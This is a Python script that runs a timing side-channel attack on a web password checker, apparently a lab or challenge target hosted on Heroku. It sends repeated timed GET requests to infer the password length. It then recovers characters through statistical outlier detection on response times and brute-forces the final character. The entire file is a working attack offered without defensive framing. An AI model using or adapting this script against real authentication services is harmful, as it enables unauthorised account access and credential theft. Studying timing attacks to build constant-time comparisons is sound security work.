import requests
import time
import math

MAX_LEN = 24

url = r'https://passwordserver.herokuapp.com/'
started = time.time()
# POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


POOL = 'A1IHiy24U3uV'


# POOL = 'Hiy2Uu'
def mean(values):
    sum = 0.0
    for a in values:
        sum += a
    return sum / len(values)


def standard_deviation(values):
    tempSum = 0
    mean1 = mean(values)
    for a in values:
        tempSum += math.pow((a - mean1), 2)
    std = math.sqrt(tempSum / len(values))
    # print('mean:' + str(mean1)+', std:'+str(std))
    return std


def outliers(samples, threshold):
    mean1 = mean(samples.values())
    std = standard_deviation(samples.values())
    ol = {}
    for item in samples:
        print(f'{item}, {samples[item]}, {mean1}, {std}')
        if samples[item] > (mean1 + std * threshold):
            ol[item] = samples[item]
    return ol


# check 'repeat' times the duration for request/response to spcific url (url2check)
# return array with measured duration of requestqresponse to url
def timeit(url2check, repeat=1):
    tt = []
    for _ in range(repeat):
        start = time.time()
        r = requests.get(url2check, allow_redirects=True)
        end = time.time()
        tt.append(end - start)
    return tt


# find the password length
# logic: search for average highest duration
# assumption: duration for the correct length is higher than for length for incorrect length
def find_pass_len(pswd_start_len=1):
    count = 0
    checks = []
    check_len = pswd_start_len
    while check_len < MAX_LEN:
        url1 = url + '/' + ("").ljust(check_len, '_')
        checks.append(min(timeit(url1, 10)))
        if checks[-1] > min(checks) + 0.09:
            print(checks[-1])
            count += 1
            if count > 1:
                print(count)
                raise Exception("network error pls try again")
        print(f'Checking password length {check_len}: min time {checks[-1]}')
        check_len += 1
    idx = checks.index(max(checks))
    idx += pswd_start_len
    print(f"Password length found: {idx}")
    return idx


def find_password(length):
    passw = ""
    goodDict = {}
    for j in range(length - 1):
        goodDict = {}
        checks = []
        for i in range(len(POOL)):
            url1 = url + '/' + (passw + POOL[i] + "_" * (length - 1 - j))
            print(f'checking for: {url1}')
            checks.append(min(timeit(url1, 5)))
            print(f'min time {checks[-1]}')
            goodDict[POOL[i]] = checks[-1]
        goodDict = outliers(goodDict, 0.2)
        if len(passw) != 3:
            passw += max(goodDict.keys(), key=(lambda k: goodDict[k]))
        else:
            passw += min(goodDict.keys(), key=(lambda k: goodDict[k]))
        print(passw)
    return passw


def find_pass_last_char(passw):
    for i in POOL:
        url1 = url + '/' + (passw + i)
        print(f'checking for: {str(passw + i)}')
        r = requests.get(url1, allow_redirects=True)
        if r.content == b'1':
            print(f'password found: {str(passw + i)}')
            return str(passw + i)


print(find_pass_last_char(find_password(4)))
ended = time.time()
print("time" + str(started - ended))
